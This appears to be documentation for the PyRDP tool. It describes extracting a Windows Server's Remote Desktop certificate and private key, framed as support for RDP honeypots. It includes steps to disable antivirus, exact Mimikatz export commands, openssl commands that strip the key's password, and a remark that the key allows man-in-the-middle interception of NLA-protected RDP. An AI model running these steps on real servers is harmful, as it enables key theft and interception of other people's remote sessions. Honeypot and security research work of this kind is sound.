# Extracting Windows Server Remote Desktop Certificate

This procedure is useful when running honeypots to support CredSSP (using `--auth ssp`).
It requires Administrative privileges on the target server and the use of Mimikatz, so it assumes that you are able to deactivate the Anti-Virus on the target server.


> **WARNING**: Cloning the certificate of the RDP server does not mean that the certificate will be trusted. Certificate trust requires a signed certificate from a CA that is **trusted** by the client. This is not likely to be the case in most scenarios. If you want to do that, you are on your own.

## Steps

1. Turn off AV so mimikatz doesn't get flagged. (Or use excluded directory)
2. Download [mimikatz latest release](https://github.com/gentilkiwi/mimikatz/releases)
3. Go to `Start > Run... > certlm.msc` (optional)
4. Identify the valid certificate under `Remote Desktop > Certificates` and note the thumbprint (optional)
5. Export the Remote Desktop certificates using Mimikatz:

   ```
   privilege::debug
   token::elevate
   crypto::capi
   crypto::certificates /systemstore:LOCAL_MACHINE /store:"Remote Desktop" /export
   ```

6. Convert public key to `.pem` using openssl:

   ```
   openssl x509 -inform DER -outform PEM -in pubkey.der -out pubkey.pem
   ```

7. Remove private key password (password for `.pfx` is "mimikatz")

   ```
   openssl pkcs12 -nodes -in privkey.pfx -out privkey.key
   ```

> **NOTE**: If `token::elevate` doesn't work. Make sure you are running mimikatz as SYSTEM (ie: under `psexec -s cmd.exe`)

You can now run `pyrdp-mitm` by specifying `-k privkey.key -c pubkey.pem` and PyRDP will serve the same certificate as the server.
With the certificate and the private key, RDP servers with Network Level Authentication (NLA) enabled can be MITM.
Use `--auth ssp` to do that.
